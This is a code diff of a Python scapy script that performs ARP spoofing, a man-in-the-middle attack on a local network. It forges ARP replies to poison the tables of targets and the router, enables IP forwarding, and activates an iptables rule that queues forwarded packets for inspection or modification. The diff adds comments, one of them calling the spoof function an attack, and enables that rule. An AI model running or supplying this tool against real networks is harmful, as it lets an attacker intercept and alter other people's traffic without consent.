@@ -14,6 +14,8 @@ from time import sleep
 import os
 
 
+# Get ip and return mac address for this ip in you network
+
 def get_mac(ip):
     arp_request = scapy.ARP(pdst=ip)
     broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
@@ -21,11 +23,15 @@ def get_mac(ip):
     answered_list = scapy.srp(arb, timeout=1, verbose=False)[0]
     return answered_list[0][1].hwsrc
 
+# It function start arp spoof attack
+
 
 def spoof(target_ip, spoof_ip):
     target_mac = get_mac(target_ip)
     packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
     scapy.send(packet, verbose=False)
+
+# Function restore arp table on switch and target computer
 
 
 def restore(dst_ip, src_ip):
@@ -38,7 +44,7 @@ def restore(dst_ip, src_ip):
 # 192.168.1.2 - IP for test
 # 192.168.1.3 - IP for test
 os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
-# os.system("iptables -I FORWARD -j NFQUEUE --queue-num 0")
+os.system("iptables -I FORWARD -j NFQUEUE --queue-num 0")
 aim_ip = ["192.168.1.2", "192.168.1.3"]
 router_ip = "192.168.1.1"
 packets_count = 2
